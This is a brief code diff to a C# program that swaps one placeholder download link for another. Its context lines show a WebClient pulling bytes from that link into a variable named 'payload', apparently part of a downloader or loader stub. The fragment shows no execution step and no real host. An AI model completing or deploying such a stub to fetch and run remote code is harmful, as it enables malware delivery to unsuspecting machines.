@@ -6,7 +6,7 @@ class Program
 {
     static void Main(string[] args)
     {
-        string downloadLink = "[YOUR_DOWNLOAD_LINK]";
+        string downloadLink = "[DOWNLOAD_LINK]";
 
         WebClient wc = new WebClient();
         byte[] payload = wc.DownloadData(downloadLink);
